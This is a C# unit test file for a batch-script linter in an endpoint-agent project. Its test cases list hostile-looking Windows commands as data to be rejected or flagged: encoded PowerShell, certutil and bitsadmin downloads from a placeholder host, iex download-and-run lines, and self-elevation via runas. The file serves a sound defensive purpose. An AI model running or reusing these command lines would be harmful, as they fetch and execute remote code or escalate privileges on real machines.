using EndpointAgents.Shared.Office;

namespace ControlPlane.Api.Tests;

public sealed class BatScriptLintTests
{
    [Theory]
    [InlineData("runas /user:Administrator cmd")]
    [InlineData("powershell -Command \"Start-Process cmd -Verb RunAs\"")]
    [InlineData("powershell -NoProfile -EncodedCommand SQBFAFgA")]
    [InlineData("powershell -nop -enc SQBFAFgA")]
    [InlineData("certutil -decode payload.b64 run.ps1")]
    [InlineData("certutil -urlcache -f http://example.test/x.bat x.bat")]
    [InlineData("bitsadmin /transfer job http://example.test/x x")]
    [InlineData("powershell iex (New-Object Net.WebClient).DownloadString('x')")]
    public void UnreviewablePayloadsAndElevationAreRejected(string line)
    {
        var result = BatScriptLint.Inspect($"@echo off\r\n{line}\r\nexit /b 0\r\n");

        Assert.Single(result.Errors);
        Assert.StartsWith("Line 2:", result.Errors[0]);
    }

    [Theory]
    [InlineData("timeout /t 5")]
    [InlineData("start \"\" notepad.exe")]
    [InlineData("if exist x.txt (start x.txt)")]
    [InlineData("mshta vbscript:Close()")]
    [InlineData("msg * hello")]
    [InlineData("call %TEMP%\\next.bat")]
    [InlineData("reg add hkcu\\software\\classes\\.x\\shell\\runas\\command /f /ve /d cmd")]
    [InlineData("powershell -nop -c \"Invoke-Expression $code\"")]
    [InlineData("powershell -nop -c iex($payload)")]
    [InlineData("expand -R package.cab -F:* .")]
    [InlineData("powershell -nop -c \"Get-Content '%~f0' | Out-Null\"")]
    public void FragileUnattendedCommandsAreWarnings(string line)
    {
        var result = BatScriptLint.Inspect($"@echo off\r\n{line}\r\n");

        Assert.Empty(result.Errors);
        Assert.Single(result.Warnings);
    }

    [Theory]
    [InlineData("runas /user:Administrator cmd", BatRisks.SelfElevation)]
    [InlineData("powershell -Command \"Start-Process cmd -Verb RunAs\"", BatRisks.SelfElevation)]
    [InlineData("powershell -NoProfile -EncodedCommand SQBFAFgA", BatRisks.EmbeddedPayload)]
    [InlineData("certutil -decode payload.b64 run.ps1", BatRisks.EmbeddedPayload)]
    public void AcceptedRiskTurnsTheErrorIntoAWarning(string line, string risk)
    {
        var script = $"@echo off\r\n{line}\r\nexit /b 0\r\n";

        var blocked = BatScriptLint.Inspect(script);
        var accepted = BatScriptLint.Inspect(script, [risk]);

        Assert.Single(blocked.Errors);
        Assert.Empty(accepted.Errors);
        Assert.Contains(accepted.Warnings, warning => warning.StartsWith($"Accepted risk ({risk})"));
    }

    [Fact]
    public void AcceptingOneRiskDoesNotAcceptTheOther()
    {
        var script = "@echo off\r\nrunas /user:x cmd\r\ncertutil -decode a b\r\n";

        var result = BatScriptLint.Inspect(script, [BatRisks.SelfElevation]);

        var error = Assert.Single(result.Errors);
        Assert.StartsWith("Line 3:", error);
    }

    [Theory]
    [InlineData("certutil -urlcache -f http://example.test/x.bat x.bat")]
    [InlineData("bitsadmin /transfer job http://example.test/x x")]
    [InlineData("powershell (New-Object Net.WebClient).DownloadFile('http://x','y')")]
    [InlineData("powershell Invoke-WebRequest http://example.test/x")]
    public void DownloadsCanNeverBeAccepted(string line)
    {
        var script = $"@echo off\r\n{line}\r\n";

        var result = BatScriptLint.Inspect(script,
            [BatRisks.SelfElevation, BatRisks.EmbeddedPayload, BatRisks.NetworkDownload,
                "network-download", "anything"]);

        var error = Assert.Single(result.Errors);
        Assert.Contains("cannot be accepted", error);
        Assert.False(BatRisks.IsAcceptable(BatRisks.NetworkDownload));
    }

    [Fact]
    public void RiskNamesAreCaseInsensitive()
    {
        var result = BatScriptLint.Inspect("@echo off\r\nrunas /user:x cmd\r\n", ["Self-Elevation"]);

        Assert.Empty(result.Errors);
    }

    [Fact]
    public void CommentsLabelsAndOrdinaryTextAreIgnored()
    {
        var result = BatScriptLint.Inspect(string.Join("\r\n",
            "@echo off",
            "rem runas /user:x and timeout /t 5 are only described here",
            ":: start a new window would be bad",
            ":start",
            "goto start",
            "echo Please restart Office after the repair.",
            "set /p \"choice=Main menu choice: \"",
            "exit /b 0"));

        Assert.Empty(result.Errors);
        Assert.Empty(result.Warnings);
    }

    [Fact]
    public void CheckedInSampleBatsAreClean()
    {
        var root = FindRepositoryRoot();
        foreach (var path in new[]
        {
            Path.Combine(root, "deploy", "samples", "menu-scenarios-sample.bat"),
            Path.Combine(root, "deploy", "control-plane", "FileRepository", "packages",
                "office-activation-repair", "office-activation-repair.bat")
        })
        {
            var result = BatScriptLint.Inspect(File.ReadAllText(path));
            Assert.Empty(result.Errors);
            Assert.Empty(result.Warnings);
        }
    }

    private static string FindRepositoryRoot()
    {
        var directory = new DirectoryInfo(AppContext.BaseDirectory);
        while (directory is not null
               && !File.Exists(Path.Combine(directory.FullName, "EndpointAgents.slnx")))
            directory = directory.Parent;
        return directory?.FullName
            ?? throw new DirectoryNotFoundException("Repository root not found.");
    }
}
